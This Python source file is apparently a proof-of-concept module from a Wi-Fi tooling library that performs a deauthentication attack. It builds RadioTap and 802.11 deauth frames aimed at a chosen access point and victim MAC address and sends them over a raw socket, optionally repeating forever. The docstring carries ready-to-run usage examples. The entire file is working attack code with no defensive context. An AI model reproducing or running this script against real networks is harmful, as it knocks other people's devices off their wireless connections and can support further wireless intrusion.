"""Deauthentication Attack.

Usage:
	python3 -m agv.poc.wifi.deauth <bss> <victim> <interface> [repeat]

Args:
	bss: SSID or BSSID.
	victim: MAC address
	interface: interface to use.
	repeat: optional, interval in seconds before to reiterate the attack.
		Default don't repeat.

Examples:
	python3 -m agv.poc.wifi.deauth MyWifi 00:aa:11:bb:22:cc mon0 3
	python3 -m agv.poc.wifi.deauth MyWifi 00:aa:11:bb:22:cc mon0
	python3 -m agv.poc.wifi.deauth dd:aa:11:bb:ee:cc 00:aa:11:bb:22:cc mon0

"""
import socket, time, sys
from agave.core.ethernet import MACAddress
from agave.core.buffer import Buffer
from agave.core.wifi.radiotap import RadioTapHeader
from agave.core.wifi.mac import Deauthentication
from agave.utils.interfaces import NetworkInterfaceNotFound
from agv.blocks.wifi import ServiceSetNotFound, get_service_set_address


def read_mac(x: str) -> MACAddress:
	try:
		return MACAddress(x)
	except ValueError:
		print("Invalid MAC Address {}".format(x))
		exit(0)


def read_bssid(x: str, i: str) -> MACAddress:
	try:
		return MACAddress(x)
	except ValueError:
		try:
			return get_service_set_address(x, i)
		except ServiceSetNotFound:
			print("Couldn't find a SS {}".format(x))
			exit(0)
		except NetworkInterfaceNotFound as e:
			print(e)
			exit(0)


if __name__ == "__main__":
	# Parse arguments
	interface = sys.argv[3]
	bssid = read_bssid(sys.argv[1], interface)
	target = read_mac(sys.argv[2])
	repeat = float(sys.argv[4]) if len(sys.argv) > 4 else None
	# Build frames
	radiotap = RadioTapHeader.build()
	wifi = Deauthentication.build(ap=bssid, station=target, sequence_control=0,
		reason=Deauthentication.REASON_STA_IS_LEAVING_OR_HAS_LEFT)
	# Assemble
	buf = Buffer.from_bytes(b'', "little")
	radiotap.write_to_buffer(buf)
	wifi.write_to_buffer(buf)
	packet = bytes(buf)
	# Send
	sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
	if repeat is None:
		sock.sendto(packet, (interface, 0))
	else:
		try:
			print(f"Loop interval: {repeat}s\nOn going...")
			while True:
				sock.sendto(packet, (interface, 0))
				time.sleep(repeat)
		except KeyboardInterrupt:
			pass

